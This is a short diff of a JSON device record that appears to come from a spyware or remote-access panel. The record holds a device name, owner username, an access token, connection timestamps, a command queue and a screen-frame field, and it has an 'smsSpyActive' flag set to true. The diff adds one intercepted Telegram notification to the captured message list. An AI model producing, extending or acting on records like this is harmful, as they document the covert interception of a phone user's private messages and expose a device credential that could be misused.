@@ -4,7 +4,7 @@
     "deviceName": "HP-KONTOL-4095",
     "ownerUsername": "Ubill_raa",
     "token": "5fab7b001467c4f88275cc7fd6cb0312",
-    "lastSeen": 1777065066476,
+    "lastSeen": 1777065093617,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-24T20:08:51.057Z",
@@ -20,6 +20,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "Telegram",
+        "sender": "𝗚𝗕 𝗖𝗣𝗔𝗡𝗘𝗟 𝗔𝗟𝗟 𝗥𝗢𝗟𝗘 𝗕𝗬 DAFF: 𝙲𝚒𝚗𝚍𝚢 𝙲𝚕𝚊𝚛𝚒𝚜𝚊",
+        "content": "/addallrt",
+        "time": "25/04 04:11",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1777065094783
+      },
       {
         "appName": "Telegram",
         "sender": "𝗚𝗕 𝗖𝗣𝗔𝗡𝗘𝗟 𝗔𝗟𝗟 𝗥𝗢𝗟𝗘 𝗕𝗬 DAFF: AsistenCpanel",
